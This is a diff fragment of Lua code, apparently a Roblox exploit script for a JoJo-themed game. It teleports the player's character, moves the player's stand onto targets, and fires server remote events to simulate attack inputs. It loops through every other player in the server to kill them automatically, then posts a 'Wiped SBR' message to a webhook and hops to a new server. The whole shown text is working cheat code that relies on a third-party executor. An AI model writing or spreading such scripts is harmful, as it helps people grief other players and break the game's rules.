+        a = false
+        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2635, 499, -3894)
+        wait(0.30)
+    print("health 0")
+    if #game.Players:GetChildren() <= 2 then
+        sendWebhook("Wiped SBR", true)
+        game.TeleportService:Teleport(2809202155)
+    end
+    game.Players.LocalPlayer.ChildRemoved:Connect(function(WORKPLAZ)
+        if WORKPLAZ.Name == npcName or WORKPLAZ.Name == NPC.Name then
+            a = false
+        end
+    end)
+end
+    
+        if not NPC:FindFirstChild("HumanoidRootPart") then
+            return true
+        end
+
+        if LocalPlayer.PlayerStats.Stand.Value == "Aerosmith" then
+            LocalPlayer.Character.HumanoidRootPart.CFrame = NPC.HumanoidRootPart.CFrame - NPC.HumanoidRootPart.CFrame.lookVector + Vector3.new(0, -43, 0)
+            if LocalPlayer.Character.SummonedStand.Value then
+                if getgenv().Allowed == true then
+
+                    LocalPlayer.Character.StandMorph.HumanoidRootPart.CFrame = NPC.HumanoidRootPart.CFrame + NPC.HumanoidRootPart.CFrame.LookVector
+                
+                else LocalPlayer.Character.StandMorph.HumanoidRootPart.CFrame = CFrame.lookAt(NPC.HumanoidRootPart.Position, LocalPlayer.Character.HumanoidRootPart.Position)    
+            
+                end
+            else
+                LocalPlayer.Character.RemoteFunction:InvokeServer("ToggleStand", "Toggle")
+            end
+        end
+            LocalPlayer.Character.RemoteEvent:FireServer("InputBegan", {["Input"] = Enum.KeyCode.T})
+            LocalPlayer.Character.RemoteEvent:FireServer("InputBegan", {["Input"] = Enum.KeyCode.R})
+        end
+
+    print("DEBUG CHECK 3")
+end
+
+for _,v in pairs(game.Players:GetChildren()) do
+        if v.Name ~= LocalPlayer.Name then
+            if v and workspace.Living:FindFirstChild(v.Name) then
+                if v.Character:FindFirstChild("Humanoid") then
+                    if v.Character.Humanoid.Health ~= 0 then
+        killNPC(v.Name)
+                    end
+                end
+            end
+            else print("Not found in workspasce")
+        end
+    end
+end
